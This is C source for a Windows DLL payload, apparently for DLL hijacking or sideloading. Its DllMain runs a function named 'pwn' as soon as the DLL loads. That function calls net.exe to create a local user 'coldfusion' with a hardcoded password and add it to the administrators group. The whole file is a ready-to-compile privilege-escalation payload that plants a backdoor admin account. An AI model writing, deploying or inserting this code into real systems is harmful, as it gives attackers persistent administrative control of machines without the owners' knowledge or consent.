#include <windows.h>
#include <stdio.h>
#include <stdlib.h>


int pwn()
{
	WinExec("C:\\Windows\\System32\\net.exe users coldfusion c0!dfusion /add", 0);
	WinExec("C:\\Windows\\System32\\net.exe localgroup administrators coldfusion /add", 0);
	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		pwn();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

